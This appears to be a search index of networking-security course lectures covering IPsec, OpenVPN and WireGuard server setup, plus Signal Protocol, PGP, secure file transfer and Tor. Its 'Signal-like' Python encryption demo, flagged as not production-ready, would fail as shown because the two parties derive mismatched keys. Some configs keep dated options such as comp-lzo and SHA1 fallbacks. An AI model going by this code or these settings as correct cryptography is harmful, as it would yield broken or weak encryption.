Used for end-to-end communication - More efficient Tunnel Mode: - Encrypts entire IP packet - New IP header added - Used for site-to-site VPNs - More secure","title":"IPsec Components"},{"location":"LECTURES/unit11/lesson11-2/#ipsec-configuration","text":"Phase 1 (IKE Phase 1) - ISAKMP SA: Establishes secure channel for negotiation. Main Mode (6 messages): Initiator \u2192 Responder: SA proposal Responder \u2192 Initiator: SA acceptance Initiator \u2192 Responder: Key exchange Responder \u2192 Initiator: Key exchange Initiator \u2192 Responder: Authentication Responder \u2192 Initiator: Authentication Aggressive Mode (3 messages): - Faster but less secure - Identity sent in clear - Used when IP address changes Phase 1 parameters: - Encryption: AES-256, AES-128, 3DES - Hash: SHA-256, SHA-1, MD5 - Authentication: Pre-shared key, certificates - DH Group: 2, 5, 14, 15, 16, 19, 20 - Lifetime: 86400 seconds (24 hours) Phase 2 (IKE Phase 2) - IPsec SA: Negotiates parameters for actual data encryption. Quick Mode: - Uses Phase 1 channel - Negotiates IPsec parameters - Can create multiple Phase 2 SAs Phase 2 parameters: - Protocol: ESP or AH - Encryption: AES-256, AES-128 - Authentication: SHA-256, SHA-1 - PFS (Perfect Forward Secrecy): DH group - Lifetime: 3600 seconds (1 hour)","title":"IPsec Configuration"},{"location":"LECTURES/unit11/lesson11-2/#strongswan-ipsec-configuration","text":"Install StrongSwan: sudo apt update sudo apt install strongswan strongswan-pki Generate certificates: # Generate CA key ipsec pki --gen --type rsa --size 4096 --outform pem > ca.key.pem # Generate CA certificate ipsec pki --self --ca --lifetime 3650 \\ --in ca.key.pem --type rsa \\ --dn \"CN=VPN CA\" \\ --outform pem > ca.cert.pem # Generate server key ipsec pki --gen --type rsa --size 4096 --outform pem > server.key.pem # Generate server certificate ipsec pki --pub --in server.key.pem --type rsa | \\ ipsec pki --issue --lifetime 1825 \\ --cacert ca.cert.pem --cakey ca.key.pem \\ --dn \"CN=vpn.example.com\" --san vpn.example.com \\ --flag serverAuth --flag ikeIntermediate \\ --outform pem > server.cert.pem # Copy to system sudo cp ca.cert.pem /etc/ipsec.d/cacerts/ sudo cp server.cert.pem /etc/ipsec.d/certs/ sudo cp server.key.pem /etc/ipsec.d/private/ Configure /etc/ipsec.conf: config setup charondebug=\"ike 2, knl 2, cfg 2, net 2, esp 2, dmn 2, mgr 2\" strictcrlpolicy=no uniqueids=yes conn ikev2-vpn auto=add compress=no type=tunnel keyexchange=ikev2 fragmentation=yes forceencaps=yes # IKE Phase 1 ike=aes256-sha256-modp2048,aes256-sha1-modp2048! # IKE Phase 2 esp=aes256-sha256,aes256-sha1! # Dead Peer Detection dpdaction=clear dpddelay=300s dpdtimeout=600s # Server side left=%any leftid=@vpn.example.com leftcert=server.cert.pem leftsendcert=always leftsubnet=0.0.0.0/0 # Client side right=%any rightid=%any rightauth=eap-mschapv2 rightsourceip=10.10.10.0/24 rightdns=8.8.8.8,8.8.4.4 rightsendcert=never # Automatic key renegotiation rekey=yes ikelifetime=24h lifetime=8h Configure /etc/ipsec.secrets: : RSA server.key.pem username : EAP \"password\" Enable IP forwarding: echo \"net.ipv4.ip_forward=1\" | sudo tee -a /etc/sysctl.conf sudo sysctl -p Configure firewall: # Allow IPsec sudo ufw allow 500/udp sudo ufw allow 4500/udp # NAT for VPN clients sudo iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -o eth0 -j MASQUERADE sudo iptables -A FORWARD -s 10.10.10.0/24 -j ACCEPT sudo iptables -A FORWARD -d 10.10.10.0/24 -j ACCEPT Start service: sudo systemctl restart strongswan-starter sudo systemctl enable strongswan-starter","title":"StrongSwan IPsec Configuration"},{"location":"LECTURES/unit11/lesson11-2/#openvpn","text":"","title":"OpenVPN"},{"location":"LECTURES/unit11/lesson11-2/#openvpn-architecture","text":"Advantages: - Works over TCP or UDP - Highly configurable - Strong encryption - Cross-platform - Can traverse NAT easily Disadvantages: - Slower than WireGuard - More complex configuration - Larger codebase","title":"OpenVPN Architecture"},{"location":"LECTURES/unit11/lesson11-2/#openvpn-server-setup","text":"Install OpenVPN: sudo apt update sudo apt install openvpn easy-rsa Set up PKI: # Copy easy-rsa make-cadir ~/openvpn-ca cd ~/openvpn-ca # Edit vars file nano vars # Set KEY_COUNTRY, KEY_PROVINCE, KEY_CITY, KEY_ORG, KEY_EMAIL # Source vars source vars # Clean and build CA ./clean-all ./build-ca # Generate server certificate ./build-key-server server # Generate Diffie-Hellman parameters ./build-dh # Generate HMAC signature openvpn --genkey --secret keys/ta.key # Copy keys to OpenVPN directory sudo cp keys/{ca.crt,server.crt,server.key,dh2048.pem,ta.key} /etc/openvpn/ Configure /etc/openvpn/server.conf: # Network settings port 1194 proto udp dev tun # Certificates and keys ca ca.crt cert server.crt key server.key dh dh2048.pem # Network topology server 10.8.0.0 255.255.255.0 topology subnet # Push routes to clients push \"redirect-gateway def1 bypass-dhcp\" push \"dhcp-option DNS 8.8.8.8\" push \"dhcp-option DNS 8.8.4.4\" # Client configuration client-to-client keepalive 10 120 cipher AES-256-GCM auth SHA256 # TLS security tls-auth ta.key 0 tls-version-min 1.2 # Privileges user nobody group nogroup # Persistence persist-key persist-tun # Logging status /var/log/openvpn-status.log log-append /var/log/openvpn.log verb 3 # Optional: compression comp-lzo Enable IP forwarding and NAT: # Enable forwarding sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf sudo sysctl -p # Configure firewall sudo ufw allow 1194/udp sudo ufw allow OpenSSH # NAT for VPN clients sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE Start OpenVPN: sudo systemctl start openvpn@server sudo systemctl enable openvpn@server","title":"OpenVPN Server Setup"},{"location":"LECTURES/unit11/lesson11-2/#openvpn-client-configuration","text":"Generate client certificate: cd ~/openvpn-ca source vars ./build-key client1 Create client config file (client1.ovpn): client dev tun proto udp remote vpn.example.com 1194 resolv-retry infinite nobind user nobody group nogroup persist-key persist-tun remote-cert-tls server cipher AES-256-GCM auth SHA256 comp-lzo verb 3 # Inline certificates <ca> [paste contents of ca.crt] </ca> <cert> [paste contents of client1.crt] </cert> <key> [paste contents of client1.key] </key> <tls-auth> [paste contents of ta.key] </tls-auth> key-direction 1 Connect client: sudo openvpn --config client1.ovpn","title":"OpenVPN Client Configuration"},{"location":"LECTURES/unit11/lesson11-2/#wireguard","text":"","title":"WireGuard"},{"location":"LECTURES/unit11/lesson11-2/#wireguard-advantages","text":"Why WireGuard is gaining popularity: - Extremely fast (faster than IPsec and OpenVPN) - Simple configuration - Modern cryptography (no cipher negotiation) - Small codebase (~4,000 lines vs OpenVPN's 100,000+) - Built into Linux kernel (5.6+) - Cross-platform Cryptography: - ChaCha20 for encryption - Poly1305 for authentication - Curve25519 for key exchange - BLAKE2s for hashing - No cipher negotiation - uses best practices only","title":"WireGuard Advantages"},{"location":"LECTURES/unit11/lesson11-2/#wireguard-server-setup","text":"Install WireGuard: sudo apt update sudo apt install wireguard Generate keys: # Generate server keys wg genkey | sudo tee /etc/wireguard/server_private.key sudo chmod 600 /etc/wireguard/server_private.key sudo cat /etc/wireguard/server_private.key | wg pubkey | sudo tee /etc/wireguard/server_public.key # Generate client keys wg genkey | tee client_private.key cat client_private.key | wg pubkey > client_public.key Configure /etc/wireguard/wg0.conf: [Interface] Address = 10.0.0.1/24 ListenPort = 51820 PrivateKey = [server_private_key] # IP forwarding PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE # Client 1 [Peer] PublicKey = [client1_public_key] AllowedIPs = 10.0.0.2/32 # Client 2 [Peer] PublicKey = [client2_public_key] AllowedIPs = 10.0.0.3/32 Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1 echo \"net.ipv4.ip_forward=1\" | sudo tee -a /etc/sysctl.conf Open firewall: sudo ufw allow 51820/udp Start WireGuard: sudo wg-quick up wg0 sudo systemctl enable wg-quick@wg0","title":"WireGuard Server Setup"},{"location":"LECTURES/unit11/lesson11-2/#wireguard-client-configuration","text":"Client config file (wg0-client.conf): [Interface] Address = 10.0.0.2/24 PrivateKey = [client_private_key] DNS = 8.8.8.8 [Peer] PublicKey = [server_public_key] Endpoint = vpn.example.com:51820 AllowedIPs = 0.0.0.0/0 PersistentKeepalive = 25 Connect: sudo wg-quick up wg0-client Check status: sudo wg show","title":"WireGuard Client Configuration"},{"location":"LECTURES/unit11/lesson11-2/#vpn-performance-optimization","text":"","title":"VPN Performance Optimization"},{"location":"LECTURES/unit11/lesson11-2/#wireguard-performance","text":"Typical throughput: - WireGuard: 1000+ Mbps - OpenVPN: 100-300 Mbps - IPsec: 400-600 Mbps Optimization tips: - Use UDP (not TCP) - Enable MTU optimization - Use modern hardware with AES-NI - Minimize latency to VPN server","title":"WireGuard Performance"},{"location":"LECTURES/unit11/lesson11-2/#openvpn-optimization","text":"Optimize /etc/openvpn/server.conf: # Use UDP proto udp # Optimize buffer sizes sndbuf 393216 rcvbuf 393216 push \"sndbuf 393216\" push \"rcvbuf 393216\" # Use faster cipher cipher AES-128-GCM # Compression (can help or hurt depending on data) comp-lzo adaptive # Faster TLS tls-cipher TLS-ECDHE-RSA-WITH-AES-128-GCM-SHA256 # Optimize TCP settings tcp-nodelay","title":"OpenVPN Optimization"},{"location":"LECTURES/unit11/lesson11-2/#vpn-security-best-practices","text":"","title":"VPN Security Best Practices"},{"location":"LECTURES/unit11/lesson11-2/#authentication","text":"Use strong authentication: - Certificate-based (best) - Multi-factor authentication - Avoid pre-shared keys for remote access - Rotate credentials regularly","title":"Authentication"},{"location":"LECTURES/unit11/lesson11-2/#encryption","text":"Use modern ciphers: - AES-256-GCM - ChaCha20-Poly1305 - Avoid: DES, 3DES, MD5, SHA1","title":"Encryption"},{"location":"LECTURES/unit11/lesson11-2/#access-control","text":"Implement least privilege: - Limit which networks clients can access - Use split-tunnel when appropriate - Implement network segmentation - Log all connections","title":"Access Control"},{"location":"LECTURES/unit11/lesson11-2/#monitoring","text":"Monitor VPN usage: # OpenVPN status sudo systemctl status openvpn@server cat /var/log/openvpn-status.log # WireGuard status sudo wg show # Check connected clients sudo wg show wg0 peers","title":"Monitoring"},{"location":"LECTURES/unit11/lesson11-2/#troubleshooting-vpns","text":"","title":"Troubleshooting VPNs"},{"location":"LECTURES/unit11/lesson11-2/#common-issues","text":"Cannot connect: # Check service running sudo systemctl status openvpn@server sudo systemctl status wg-quick@wg0 # Check firewall sudo ufw status sudo iptables -L -n # Check ports sudo netstat -tulpn | grep -E '1194|51820' # Check logs sudo tail -f /var/log/openvpn.log sudo journalctl -u wg-quick@wg0 -f Connected but no internet: # Check IP forwarding sysctl net.ipv4.ip_forward # Check NAT rules sudo iptables -t nat -L -n # Test DNS dig @8.8.8.8 google.com # Check routing ip route Slow performance: # Test bandwidth iperf3 -s # On server iperf3 -c vpn_server_ip # On client # Check MTU ping -M do -s 1472 vpn_server_ip # Find optimal MTU # Monitor connections sudo tcpdump -i wg0","title":"Common Issues"},{"location":"LECTURES/unit11/lesson11-2/#key-takeaways","text":"VPN protocols: - IPsec: Industry standard, complex, good performance - OpenVPN: Flexible, widely supported, moderate performance - WireGuard: Modern, simple, best performance Implementation: - Plan architecture (site-to-site vs remote access) - Generate proper certificates - Configure encryption properly - Enable IP forwarding and NAT - Test thoroughly Security: - Use certificate-based authentication - Modern encryption algorithms - Implement access controls - Monitor and log connections - Regular updates and patches Remember: - VPNs protect data in transit only - Still need endpoint security - Performance varies by protocol - Proper configuration is critical - Test failover scenarios VPNs are fundamental to modern network security. Whether connecting remote workers or linking office locations, understanding VPN technologies lets you implement secure, reliable connectivity for your organization.","title":"Key Takeaways"},{"location":"LECTURES/unit11/lesson11-3/","text":"Secure Communication Protocols and End-to-End Encryption Beyond VPNs and TLS, modern applications need end-to-end encryption, secure messaging, and privacy-preserving technologies. This lesson covers Signal Protocol, encrypted email, secure file transfer, and emerging privacy technologies. End-to-End Encryption (E2EE) What is E2EE? End-to-end encryption ensures only sender and recipient can read messages. Traditional encryption: Alice \u2192 [Encrypted] \u2192 Server [Decrypts, Re-encrypts] \u2192 Bob Server can read messages End-to-end encryption: Alice \u2192 [Encrypted] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Bob Server cannot read messages Properties: - Only endpoints have keys - Server can't decrypt - Protects against compromised servers - Protects against government surveillance Perfect Forward Secrecy (PFS) Ensures past messages stay secure even if long-term keys compromised. How it works: - Generate new ephemeral keys for each session - Delete keys after use - Compromise of current key doesn't affect past messages Without PFS: If attacker gets private key + has recorded traffic \u2192 Can decrypt all past communications With PFS: If attacker gets private key + has recorded traffic \u2192 Can only decrypt current session \u2192 Past sessions remain secure Signal Protocol The Gold Standard of E2EE Used by: - Signal Messenger - WhatsApp - Facebook Messenger (Secret Conversations) - Google Messages (RCS) - Skype (Private Conversations) Security properties: - End-to-end encryption - Perfect forward secrecy - Post-compromise security (future secrecy) - Deniability - Asynchronous messaging Double Ratchet Algorithm Core of Signal Protocol Two ratchets: 1. Diffie-Hellman Ratchet: - New key agreement with each message - Provides forward secrecy - Updates shared secrets 2. Symmetric Key Ratchet: - Derives new keys from previous keys - Used between DH ratchet updates - Fast and efficient Key hierarchy: Root Key \u2193 Chain Keys (sending and receiving) \u2193 Message Keys (one per message) How it works: Alice Bob ------ ----- Generate DH keypair Send DH public key \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Receive Alice's DH public key Perform DH key agreement Derive chain keys \u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Send encrypted message Receive message Derive message key Decrypt message Generate new DH keypair Send encrypted message \u2500\u2500\u2500\u2500\u2500\u2192 Perform new DH key agreement Derive new chain keys ... Each message: 1. Derives unique message key 2. Deletes key after encryption/decryption 3. Can't be decrypted again X3DH (Extended Triple Diffie-Hellman) Initial key agreement for asynchronous messaging Allows: - Encrypted messages to offline recipients - No real-time interaction needed - Immediate forward secrecy Keys involved: - Identity key (long-term) - Signed prekey (medium-term) - One-time prekeys (single-use) - Ephemeral key (session-specific) Process: Bob (offline) publishes to server: - Identity public key (IKb) - Signed prekey (SPKb) - Multiple one-time prekeys (OPKb) Alice wants to message Bob: 1. Fetch Bob's keys from server 2. Generate ephemeral key (EKa) 3. Perform 3 or 4 DH operations: - DH(IKa, SPKb) - DH(EKa, IKb) - DH(EKa, SPKb) - DH(EKa, OPKb) [if one-time prekey available] 4. Combine DH results into shared secret 5. Send initial message with EKa Bob comes online: 1. Receives message with Alice's EKa 2. Performs same DH operations 3. Derives same shared secret 4. Decrypts message 5. Deletes one-time prekey Implementing Signal-like Encryption Simple example (not production-ready): from cryptography.hazmat.primitives.asymmetric import x25519 from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.hkdf import HKDF from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes import os class SignalLikeEncryption: def __init__(self): # Long-term identity key self.identity_private = x25519.X25519PrivateKey.generate() self.identity_public = self.identity_private.public_key() # Current ratchet keys self.ratchet_private = None self.ratchet_public = None # Chain keys self.sending_chain_key = None self.receiving_chain_key = None def kdf(self, input_key_material, salt=None): \"\"\"Key derivation function\"\"\" if salt is None: salt = b'\\x00' * 32 kdf = HKDF( algorithm=hashes.SHA256(), length=32, salt=salt, info=b'Signal Protocol' ) return kdf.derive(input_key_material) def dh(self, private_key, public_key): \"\"\"Diffie-Hellman exchange\"\"\" return private_key.exchange(public_key) def ratchet_step(self, their_public_key): \"\"\"Perform DH ratchet step\"\"\" # Generate new ratchet keypair self.ratchet_private = x25519.X25519PrivateKey.generate() self.ratchet_public = self.ratchet_private.public_key() # Perform DH dh_output = self.dh(self.ratchet_private, their_public_key) # Derive new chain keys root_key = self.kdf(dh_output) self.sending_chain_key = self.kdf(root_key, b'sending') self.receiving_chain_key = self.kdf(root_key, b'receiving') return self.ratchet_public def encrypt_message(self, plaintext): \"\"\"Encrypt a message\"\"\" # Derive message key from chain key message_key = self.kdf(self.sending_chain_key) # Update chain key for next message self.sending_chain_key = self.kdf(self.sending_chain_key) # Encrypt iv = os.urandom(16) cipher = Cipher( algorithms.AES(message_key), modes.CTR(iv) ) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize() return iv + ciphertext def decrypt_message(self, encrypted_data): \"\"\"Decrypt a message\"\"\" # Extract IV and ciphertext iv = encrypted_data[:16] ciphertext = encrypted_data[16:] # Derive message key from chain key message_key = self.kdf(self.receiving_chain_key) # Update chain key for next message self.receiving_chain_key = self.kdf(self.receiving_chain_key) # Decrypt cipher = Cipher( algorithms.AES(message_key), modes.CTR(iv) ) decryptor = cipher.decryptor() plaintext = decryptor.update(ciphertext) + decryptor.finalize() return plaintext.decode() # Usage (simplified) alice = SignalLikeEncryption() bob = SignalLikeEncryption() # Initial key exchange bob_ratchet_public = bob.ratchet_step(alice.identity_public) alice.ratchet_step(bob_ratchet_public) # Alice sends message encrypted = alice.encrypt_message(\"Hello Bob!\") print(f\"Encrypted: {encrypted.hex()}\") # Bob receives and decrypts decrypted = bob.decrypt_message(encrypted) print(f\"Decrypted: {decrypted}\") Encrypted Email PGP/GPG Pretty Good Privacy - Email encryption standard Key management: # Generate key gpg --full-generate-key # List keys gpg --list-keys gpg --list-secret-keys # Export public key gpg --armor --export your@email.com > public_key.asc # Import someone's public key gpg --import their_public_key.asc # Sign someone's key (trust) gpg --sign-key their@email.com Encrypt email: # Encrypt message gpg --encrypt --armor --recipient recipient@email.com message.txt # Encrypt and sign gpg --encrypt --sign --armor --recipient recipient@email.com message.txt # Decrypt gpg --decrypt encrypted_message.txt.asc Using with email client: Thunderbird + Enigmail: - Install Enigmail addon - Generate or import key - Compose \u2192 Encrypt message - Automatic encryption when recipient's key available Web of Trust: You sign Alice's key (you trust Alice is Alice) Alice signs Bob's key (Alice trusts Bob is Bob) You can trust Bob's key through Alice (transitive trust) S/MIME Secure/Multipurpose Internet Mail Extensions Differences from PGP: - Uses X.509 certificates - Requires Certificate Authority - Better enterprise support - Native support in email clients - Hierarchical trust model Get certificate: 1. Purchase from CA (or use free from organizations) 2. Generate CSR 3. Submit to CA 4. Receive certificate 5. Install in email client Outlook S/MIME: - File \u2192 Options \u2192 Trust Center \u2192 Email Security - Import certificate - \"Encrypt contents and attachments\" - \"Add digital signature\" Secure File Transfer SCP (Secure Copy Protocol) Copy files over SSH: # Upload file scp local_file.txt user@remote:/path/ # Download file scp user@remote:/path/file.txt local_directory/ # Copy directory scp -r local_directory/ user@remote:/path/ # Specify port scp -P 2222 file.txt user@remote:/path/ # Preserve file attributes scp -p file.txt user@remote:/path/ SFTP (SSH File Transfer Protocol) Interactive file transfer: # Connect sftp user@remote # Navigate pwd # Print working directory lpwd # Print local working directory ls # List remote files lls # List local files cd directory # Change remote directory lcd directory # Change local directory # Transfer put local_file.txt # Upload get remote_file.txt # Download put -r directory/ # Upload directory get -r directory/ # Download directory # Exit exit rsync over SSH Efficient file synchronization: # Sync directory rsync -avz -e ssh local_dir/ user@remote:/path/ # Options explained: # -a: archive mode (preserve permissions, timestamps) # -v: verbose # -z: compress during transfer # -e ssh: use SSH # Sync with delete (mirror) rsync -avz --delete -e ssh local_dir/ user@remote:/path/ # Dry run (test without changes) rsync -avzn -e ssh local_dir/ user@remote:/path/ # Show progress rsync -avz --progress -e ssh local_dir/ user@remote:/path/ # Exclude files rsync -avz --exclude='*.log' -e ssh local_dir/ user@remote:/path/ Magic Wormhole Simple encrypted file transfer: # Install pip install magic-wormhole # Send file wormhole send file.txt # Outputs code: 7-crossword-ventilate # Receive (on other machine) wormhole receive 7-crossword-ventilate # Send directory wormhole send --code 5-example-code directory/ # The code is used for key exchange # End-to-end encrypted # Works through NAT/firewalls Encrypted Messaging Applications Signal Architecture: - Open source - Centralized servers (but can't read messages) - Phone number as identifier - Desktop and mobile apps - Voice and video calls Security features: - End-to-end encryption (Signal Protocol) - Perfect forward secrecy - Sealed sender (hide metadata) - Disappearing messages - Screen security (screenshot protection) - Registration lock - Safety numbers (verify identity) Matrix/Element Architecture: - Open source - Decentralized (federated servers) - Self-hostable - Username as identifier - Voice and video calls Security features: - End-to-end encryption (Olm/Megolm) - Device verification - Cross-signing - Encrypted attachments - Federated identity Wire Architecture: - Open source - End-to-end encrypted - Supports teams/business - No phone number required Security features: - Signal Protocol - Encrypted audio/video - Encrypted file sharing - External audit Privacy-Enhancing Technologies Tor (The Onion Router) Anonymous communication: # Install Tor sudo apt install tor # Configure as SOCKS proxy # In /etc/tor/torrc: SocksPort 9050 # Start Tor sudo systemctl start tor # Use with applications curl --socks5-hostname localhost:9050 https://check.torproject.org/ # Use Tor Browser (recommended) # Download from torproject.org How Tor works: You \u2192 Entry node \u2192 Middle node \u2192 Exit node \u2192 Destination Each hop only knows previous and next hop Destination doesn't know your IP You don't know full path Encrypted in layers (like onion) I2P (Invisible Internet Project) Anonymous network layer: # Install I2P sudo apt install i2p # Access web interface # http://127.0.0.1:7657 # I2P provides: # - Anonymous hosting # - Encrypted communication # - Distributed network # - Hidden services Mixnets Anonymize metadata through mixing: Examples: - Nym Network - Katzenpost - Loopix How it works: 1. Batch messages from multiple senders 2. Mix (reorder) messages 3. Add delays 4. Forward to next mix node 5. Repeat multiple hops 6. Deliver to recipients Result: Hard to trace which output came from which input Zero-Knowledge Proofs Prove you know something without revealing it Example: Proving age without revealing birthdate # Simplified concept (not real ZKP) def prove_over_18(birthdate, current_date): \"\"\"Prove age > 18 without revealing exact age\"\"\" age = current_date.year - birthdate.year # Create commitment commitment = hash(birthdate + random_salt) # Prove age > 18 without revealing birthdate proof = { 'commitment': commitment, 'is_over_18': age >= 18, 'verification_data': generate_zkp(age >= 18) } return proof # Verifier can confirm age > 18 # But learns nothing else about birthdate Real-world applications: - Anonymous credentials - Private voting - Blockchain privacy (Zcash) - Private authentication Secure Communication Best Practices Operational Security Communication security: - Use E2EE for sensitive conversations - Verify contacts (safety numbers) - Enable disappearing messages for sensitive topics - Be aware of metadata leakage - Use secure devices Key management: - Generate strong keys - Backup keys securely - Rotate keys regularly - Revoke compromised keys - Verify key fingerprints Platform selection: - Open source preferred - Audited by security researchers - Active maintenance - Clear threat model - Strong encryption defaults Threat Modeling Ask yourself: What are you protecting? - Messages - Metadata (who talks to whom) - Files - Identity Who are you protecting against? - Casual snoopers - Criminals - Corporations - Governments - Nation states Choose tools accordingly: - Casual privacy: Signal, Wire - High anonymity: Tor, I2P - Maximum security: Air-gapped systems Key Takeaways End-to-end encryption: - Only sender and recipient can read - Server compromise doesn't expose messages - Signal Protocol is gold standard - Requires proper key management Email security: - PGP/GPG for decentralized encryption - S/MIME for enterprise - Both require key/certificate management - Metadata still exposed File transfer: - SCP/SFTP for regular use - rsync for synchronization - Magic Wormhole for simplicity - Always verify recipients Privacy technologies: - Tor for anonymity - I2P for hidden services - Mixnets for metadata protection - Zero-knowledge proofs for selective disclosure Remember: - Encryption protects content, not metadata - Perfect forward secrecy is important - Verify keys/identities - Choose tools for your threat model - Security vs. convenience tradeoff Secure communication is more than just encryption\u2014it's about protecting privacy, ensuring authenticity, and defending against diverse threats. Understanding these technologies helps you choose the right tools and use them correctly.","title":"Lesson 11.3"},{"location":"LECTURES/unit11/lesson11-3/#secure-communication-protocols-and-end-to-end-encryption","text":"Beyond VPNs and TLS, modern applications need end-to-end encryption, secure messaging, and privacy-preserving technologies. This lesson covers Signal Protocol, encrypted email, secure file transfer, and emerging privacy technologies.","title":"Secure Communication Protocols and End-to-End Encryption"},{"location":"LECTURES/unit11/lesson11-3/#end-to-end-encryption-e2ee","text":"","title":"End-to-End Encryption (E2EE)"},{"location":"LECTURES/unit11/lesson11-3/#what-is-e2ee","text":"End-to-end encryption ensures only sender and recipient can read messages. Traditional encryption: Alice \u2192 [Encrypted] \u2192 Server [Decrypts, Re-encrypts] \u2192 Bob Server can read messages End-to-end encryption: Alice \u2192 [Encrypted] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Bob Server cannot read messages Properties: - Only endpoints have keys - Server can't decrypt - Protects against compromised servers - Protects against government surveillance","title":"What is E2EE?"},{"location":"LECTURES/unit11/lesson11-3/#perfect-forward-secrecy-pfs","text":"Ensures past messages stay secure even if long-term keys compromised. How it works: - Generate new ephemeral keys for each session - Delete keys after use - Compromise of current key doesn't affect past messages Without PFS: If attacker gets private key + has recorded traffic \u2192 Can decrypt all past communications With PFS: If attacker gets private key + has recorded traffic \u2192 Can only decrypt current session \u2192 Past sessions remain secure","title":"Perfect Forward Secrecy (PFS)"},{"location":"LECTURES/unit11/lesson11-3/#signal-protocol","text":"","title":"Signal Protocol"},{"location":"LECTURES/unit11/lesson11-3/#the-gold-standard-of-e2ee","text":"Used by: - Signal Messenger - WhatsApp - Facebook Messenger (Secret Conversations) - Google Messages (RCS) - Skype (Private Conversations) Security properties: - End-to-end encryption - Perfect forward secrecy - Post-compromise security (future secrecy) - Deniability - Asynchronous messaging","title":"The Gold Standard of E2EE"},{"location":"LECTURES/unit11/lesson11-3/#double-ratchet-algorithm","text":"Core of Signal Protocol Two ratchets: 1. Diffie-Hellman Ratchet: - New key agreement with each message - Provides forward secrecy - Updates shared secrets 2. Symmetric Key Ratchet: - Derives new keys from previous keys - Used between DH ratchet updates - Fast and efficient Key hierarchy: Root Key \u2193 Chain Keys (sending and receiving) \u2193 Message Keys (one per message) How it works: Alice Bob ------ ----- Generate DH keypair Send DH public key \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2192 Receive Alice's DH public key Perform DH key agreement Derive chain keys \u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Send encrypted message Receive message Derive message key Decrypt message Generate new DH keypair Send encrypted message \u2500\u2500\u2500\u2500\u2500\u2192 Perform new DH key agreement Derive new chain keys ... Each message: 1. Derives unique message key 2. Deletes key after encryption/decryption 3. Can't be decrypted again","title":"Double Ratchet Algorithm"},{"location":"LECTURES/unit11/lesson11-3/#x3dh-extended-triple-diffie-hellman","text":"Initial key agreement for asynchronous messaging Allows: - Encrypted messages to offline recipients - No real-time interaction needed - Immediate forward secrecy Keys involved: - Identity key (long-term) - Signed prekey (medium-term) - One-time prekeys (single-use) - Ephemeral key (session-specific) Process: Bob (offline) publishes to server: - Identity public key (IKb) - Signed prekey (SPKb) - Multiple one-time prekeys (OPKb) Alice wants to message Bob: 1. Fetch Bob's keys from server 2. Generate ephemeral key (EKa) 3. Perform 3 or 4 DH operations: - DH(IKa, SPKb) - DH(EKa, IKb) - DH(EKa, SPKb) - DH(EKa, OPKb) [if one-time prekey available] 4. Combine DH results into shared secret 5. Send initial message with EKa Bob comes online: 1. Receives message with Alice's EKa 2. Performs same DH operations 3. Derives same shared secret 4. Decrypts message 5. Deletes one-time prekey","title":"X3DH (Extended Triple Diffie-Hellman)"},{"location":"LECTURES/unit11/lesson11-3/#implementing-signal-like-encryption","text":"Simple example (not production-ready): from cryptography.hazmat.primitives.asymmetric import x25519 from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.hkdf import HKDF from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes import os class SignalLikeEncryption: def __init__(self): # Long-term identity key self.identity_private = x25519.X25519PrivateKey.generate() self.identity_public = self.identity_private.public_key() # Current ratchet keys self.ratchet_private = None self.ratchet_public = None # Chain keys self.sending_chain_key = None self.receiving_chain_key = None def kdf(self, input_key_material, salt=None): \"\"\"Key derivation function\"\"\" if salt is None: salt = b'\\x00' * 32 kdf = HKDF( algorithm=hashes.SHA256(), length=32, salt=salt, info=b'Signal Protocol' ) return kdf.derive(input_key_material) def dh(self, private_key, public_key): \"\"\"Diffie-Hellman exchange\"\"\" return private_key.exchange(public_key) def ratchet_step(self, their_public_key): \"\"\"Perform DH ratchet step\"\"\" # Generate new ratchet keypair self.ratchet_private = x25519.X25519PrivateKey.generate() self.ratchet_public = self.ratchet_private.public_key() # Perform DH dh_output = self.dh(self.ratchet_private, their_public_key) # Derive new chain keys root_key = self.kdf(dh_output) self.sending_chain_key = self.kdf(root_key, b'sending') self.receiving_chain_key = self.kdf(root_key, b'receiving') return self.ratchet_public def encrypt_message(self, plaintext): \"\"\"Encrypt a message\"\"\" # Derive message key from chain key message_key = self.kdf(self.sending_chain_key) # Update chain key for next message self.sending_chain_key = self.kdf(self.sending_chain_key) # Encrypt iv = os.urandom(16) cipher = Cipher( algorithms.AES(message_key), modes.CTR(iv) ) encryptor = cipher.encryptor() ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize() return iv + ciphertext def decrypt_message(self, encrypted_data): \"\"\"Decrypt a message\"\"\" # Extract IV and ciphertext iv = encrypted_data[:16] ciphertext = encrypted_data[16:] # Derive message key from chain key message_key = self.kdf(self.receiving_chain_key) # Update chain key for next message self.receiving_chain_key = self.kdf(self.receiving_chain_key) # Decrypt cipher = Cipher( algorithms.AES(message_key), modes.CTR(iv) ) decryptor = cipher.decryptor() plaintext = decryptor.update(ciphertext) + decryptor.finalize() return plaintext.decode() # Usage (simplified) alice = SignalLikeEncryption() bob = SignalLikeEncryption() # Initial key exchange bob_ratchet_public = bob.ratchet_step(alice.identity_public) alice.ratchet_step(bob_ratchet_public) # Alice sends message encrypted = alice.encrypt_message(\"Hello Bob!\") print(f\"Encrypted: {encrypted.hex()}\") # Bob receives and decrypts decrypted = bob.decrypt_message(encrypted) print(f\"Decrypted: {decrypted}\")","title":"Implementing Signal-like 